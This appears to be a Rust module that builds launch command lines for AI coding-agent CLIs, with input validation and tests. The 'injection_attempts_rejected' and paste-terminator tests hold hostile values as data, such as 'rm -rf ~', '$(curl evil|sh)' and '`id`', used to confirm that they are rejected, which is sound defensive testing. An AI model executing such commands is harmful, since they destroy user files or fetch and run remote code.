//! Launch argv builder (agent-providers.md §4.1 `build_launch`).

use super::detect::{resolve_program, AgentDetection, ProcessEnv};
use super::models::{validate_model_id, AgentModelInfo, SYSTEM_DEFAULT_MODEL};
use super::quote::program_path_ok;
use super::spec::{is_safe_arg, AgentProviderSpec, ResumePosition, SessionStrategy};
use super::{validate_effort, validate_session_id, AgentApprovalMode};
use crate::error::{CoreError, Result};
use std::collections::BTreeMap;
use std::path::PathBuf;

/// What to launch (the argv-relevant part of `LaunchAgentOptions`).
#[derive(Clone, Debug, Default, PartialEq)]
pub struct LaunchRequest {
    /// `None` / `"system-default"` = provider default (no model args).
    pub model: Option<String>,
    pub approval_mode: AgentApprovalMode,
    pub effort: Option<String>,
    pub resume_session_id: Option<String>,
    pub cwd: Option<PathBuf>,
}

#[derive(Clone, Debug, PartialEq)]
pub struct LaunchPlan {
    pub program: PathBuf,
    pub argv: Vec<String>,
    pub env: BTreeMap<String, String>,
}

struct Vars<'a> {
    model: Option<&'a str>,
    session_id: Option<&'a str>,
    effort: Option<&'a str>,
    cwd: Option<String>,
}

fn substitute(template: &[String], v: &Vars) -> Result<Vec<String>> {
    template
        .iter()
        .map(|t| {
            let mut s = t.clone();
            for (name, val) in [("model", v.model), ("sessionId", v.session_id), ("effort", v.effort), ("cwd", v.cwd.as_deref())] {
                let ph = format!("{{{name}}}");
                if s.contains(&ph) {
                    let val = val.ok_or_else(|| CoreError::invalid_input(format!("launch template {t:?} needs {ph}")))?;
                    s = s.replace(&ph, val);
                }
            }
            Ok(s)
        })
        .collect()
}

/// Build argv for one launch. `session_id` is the preassigned id (preassign
/// providers, not resuming). `models` = `models::models()` of the provider.
pub fn build_launch(
    spec: &AgentProviderSpec,
    det: &AgentDetection,
    req: &LaunchRequest,
    session_id: Option<&str>,
    models: &[AgentModelInfo],
    env: &ProcessEnv,
) -> Result<LaunchPlan> {
    let l = &spec.launch;
    let fmt = spec.sessions.id_format;

    // Model: in the list and in the safe charset.
    let model = req.model.as_deref().filter(|m| !m.is_empty() && *m != SYSTEM_DEFAULT_MODEL);
    if let Some(m) = model {
        validate_model_id(m)?;
        if !models.iter().any(|x| x.id == m) {
            return Err(CoreError::invalid_input(format!("unknown model {m:?} for {}", spec.display_name)));
        }
    }
    // Effort: one of the declared values.
    let effort = match (&req.effort, &l.efforts) {
        (None, _) => None,
        (Some(e), Some(spec_e)) => {
            validate_effort(e)?;
            if !spec_e.values.contains(e) {
                return Err(CoreError::invalid_input(format!("effort {e:?} is not one of {:?}", spec_e.values)));
            }
            if spec_e.omit_when_default && *e == spec_e.default {
                None
            } else {
                Some(e.as_str())
            }
        }
        (Some(e), None) => return Err(CoreError::invalid_input(format!("{} does not support effort {e:?}", spec.display_name))),
    };
    // Approval mode: a declared key (`default` always allowed).
    let approval_args = match l.approval_modes.get(req.approval_mode) {
        Some(a) => a.clone(),
        None if req.approval_mode == AgentApprovalMode::Default => Vec::new(),
        None => {
            return Err(CoreError::invalid_input(format!(
                "{} does not support approval mode {:?}",
                spec.display_name,
                req.approval_mode.as_str()
            )))
        }
    };
    if let Some(r) = &req.resume_session_id {
        validate_session_id(r, fmt)?;
        if l.resume.is_none() {
            return Err(CoreError::unsupported(format!("{} cannot resume sessions", spec.display_name)));
        }
    }
    if let Some(s) = session_id {
        validate_session_id(s, fmt)?;
    }

    let resume = req.resume_session_id.as_deref();
    let vars = Vars {
        model,
        session_id: resume.or(session_id),
        effort,
        cwd: req.cwd.as_ref().map(|p| p.to_string_lossy().to_string()),
    };
    let resume_args = match (resume, &l.resume) {
        (Some(_), Some(t)) => substitute(t, &vars)?,
        _ => Vec::new(),
    };
    let mut argv = Vec::new();
    if l.resume_position == ResumePosition::Prefix {
        argv.extend(resume_args.iter().cloned());
    }
    argv.extend(substitute(&l.args, &vars)?);
    if let (Some(_), Some(t)) = (model, &l.model) {
        argv.extend(substitute(t, &vars)?);
    }
    if resume.is_none() && spec.sessions.strategy == SessionStrategy::Preassign {
        if let (Some(_), Some(t)) = (session_id, &l.session_id) {
            argv.extend(substitute(t, &vars)?);
        }
    }
    if let (Some(_), Some(e)) = (effort, &l.efforts) {
        argv.extend(substitute(&e.args, &vars)?);
    }
    argv.extend(substitute(&approval_args, &vars)?);
    if l.resume_position == ResumePosition::Suffix {
        argv.extend(resume_args);
    }
    if let Some(bad) = argv.iter().find(|a| !is_safe_arg(a)) {
        return Err(CoreError::invalid_input(format!("unsafe launch argument {bad:?}")));
    }

    Ok(LaunchPlan { program: launch_program(spec, det, env)?, argv, env: l.env.clone() })
}

/// §4.1 rule 4: the detected absolute path, unless it contains shell
/// metacharacters — then the bare command name if it resolves on PATH.
pub fn launch_program(spec: &AgentProviderSpec, det: &AgentDetection, env: &ProcessEnv) -> Result<PathBuf> {
    let cmd = &spec.detect.command;
    if let Some(p) = det.path.as_deref().filter(|p| program_path_ok(p)) {
        return Ok(PathBuf::from(p));
    }
    if resolve_program(cmd, &[], env).is_some() && program_path_ok(cmd) {
        return Ok(PathBuf::from(cmd));
    }
    Err(CoreError::invalid_input(format!(
        "cannot launch {}: program path {:?} is unsafe and {cmd:?} is not on PATH",
        spec.display_name,
        det.path.as_deref().unwrap_or("")
    )))
}

/// Strip bracketed-paste terminators so a prompt cannot end the paste early.
pub fn bracketed_paste(prompt: &str) -> String {
    format!("\x1b[200~{}\x1b[201~", prompt.replace("\x1b[201~", "").replace("\x1b[200~", ""))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agents::catalog::parse;
    use crate::agents::models::{models, ModelSettings};
    use crate::agents::quote::{command_line, ShellKind};
    use crate::agents::spec::{fixtures, parse_spec};
    use serde_json::json;
    use std::path::Path;

    const SID: &str = "0f8fad5b-d9cb-469f-a165-70867728950e";

    fn det(path: &str) -> AgentDetection {
        AgentDetection {
            provider_id: "x".into(),
            installed: true,
            path: Some(path.into()),
            version: Some("1.0.0".into()),
            meets_min_version: true,
            error: None,
            checked_at: 0,
        }
    }

    fn model_list(key: &str) -> Vec<AgentModelInfo> {
        let cat = parse(
            json!({"schemaVersion":1,"updatedAt":"x","providers":{ key: {"models":[
                {"id":"opus[1m]","label":"Opus 1M"}, {"id":"m1","label":"M1"}
            ]}}})
            .to_string()
            .as_bytes(),
        )
        .unwrap()
        .0;
        models(key, true, &cat, &ModelSettings::default())
    }

    fn req(model: Option<&str>) -> LaunchRequest {
        LaunchRequest { model: model.map(str::to_string), ..Default::default() }
    }

    #[test]
    fn preassign_argv_order() {
        let spec = parse_spec(&fixtures::preassign()).unwrap();
        let ms = model_list("alpha");
        let env = ProcessEnv::default();
        let r = LaunchRequest {
            model: Some("opus[1m]".into()),
            approval_mode: AgentApprovalMode::Plan,
            effort: Some("max".into()),
            ..Default::default()
        };
        let plan = build_launch(&spec, &det("/opt/alpha"), &r, Some(SID), &ms, &env).unwrap();
        assert_eq!(
            plan.argv,
            ["--model", "opus[1m]", "--session", SID, "--effort", "max", "--permission-mode", "plan"]
        );
        // Default effort omitted; system-default model → no model args.
        let r = LaunchRequest { model: Some("system-default".into()), effort: Some("high".into()), ..Default::default() };
        assert_eq!(build_launch(&spec, &det("/opt/alpha"), &r, Some(SID), &ms, &env).unwrap().argv, ["--session", SID]);
        // Resume replaces sessionId args, suffix position.
        let r = LaunchRequest { resume_session_id: Some(SID.into()), approval_mode: AgentApprovalMode::Bypass, ..Default::default() };
        assert_eq!(
            build_launch(&spec, &det("/opt/alpha"), &r, None, &ms, &env).unwrap().argv,
            ["--skip-permissions", "--resume", SID]
        );
    }

    #[test]
    fn discover_resume_prefix_and_effort_template() {
        let spec = parse_spec(&fixtures::discover()).unwrap();
        let ms = model_list("beta");
        let env = ProcessEnv::default();
        let r = LaunchRequest {
            model: Some("m1".into()),
            effort: Some("high".into()),
            approval_mode: AgentApprovalMode::Auto,
            resume_session_id: Some(SID.into()),
            ..Default::default()
        };
        let plan = build_launch(&spec, &det("/opt/beta"), &r, None, &ms, &env).unwrap();
        assert_eq!(plan.argv, ["resume", SID, "--model", "m1", "-c", "model_reasoning_effort=high", "--approve-all"]);
        // Unsupported approval mode.
        let r = LaunchRequest { approval_mode: AgentApprovalMode::Plan, ..Default::default() };
        assert!(build_launch(&spec, &det("/opt/beta"), &r, None, &ms, &env).is_err());
    }

    #[test]
    fn injection_attempts_rejected() {
        let spec = parse_spec(&fixtures::preassign()).unwrap();
        let mut ms = model_list("alpha");
        let env = ProcessEnv::default();
        let d = det("/opt/alpha");
        for bad in ["x; rm -rf ~", "$(curl evil|sh)", "a\nrm -rf ~", "it's", "\"quoted\"", "`id`", "a b"] {
            // Even if a bad id somehow got into the model list.
            ms.push(AgentModelInfo { id: bad.into(), ..ms[1].clone() });
            assert!(build_launch(&spec, &d, &req(Some(bad)), Some(SID), &ms, &env).is_err(), "model {bad:?}");
            let r = LaunchRequest { resume_session_id: Some(bad.into()), ..Default::default() };
            assert!(build_launch(&spec, &d, &r, None, &ms, &env).is_err(), "resume {bad:?}");
            assert!(build_launch(&spec, &d, &req(None), Some(bad), &ms, &env).is_err(), "session {bad:?}");
            let r = LaunchRequest { effort: Some(bad.into()), ..Default::default() };
            assert!(build_launch(&spec, &d, &r, Some(SID), &ms, &env).is_err(), "effort {bad:?}");
        }
        // Unknown (but well-formed) model.
        assert!(build_launch(&spec, &d, &req(Some("not-in-list")), Some(SID), &ms, &env).is_err());
        // Unsafe program path without a PATH fallback.
        assert!(build_launch(&spec, &det("/tmp/$(evil)/alpha"), &req(None), Some(SID), &ms, &env).is_err());
    }

    #[test]
    fn opus_1m_end_to_end_quoting() {
        let spec = parse_spec(&fixtures::preassign()).unwrap();
        let ms = model_list("alpha");
        let plan = build_launch(&spec, &det("/usr/bin/alpha"), &req(Some("opus[1m]")), Some(SID), &ms, &ProcessEnv::default()).unwrap();
        let line = command_line(ShellKind::Zsh, &plan.program, &plan.argv).unwrap();
        assert_eq!(line, format!("'/usr/bin/alpha' '--model' 'opus[1m]' '--session' '{SID}'"));
        let line = command_line(ShellKind::Cmd, Path::new(r"C:\npm\alpha.cmd"), &plan.argv).unwrap();
        assert_eq!(line, format!(r#""C:\npm\alpha.cmd" "--model" "opus[1m]" "--session" "{SID}""#));
    }

    #[test]
    fn paste_terminator_stripped() {
        assert_eq!(bracketed_paste("hi\x1b[201~; rm -rf ~"), "\x1b[200~hi; rm -rf ~\x1b[201~");
    }
}
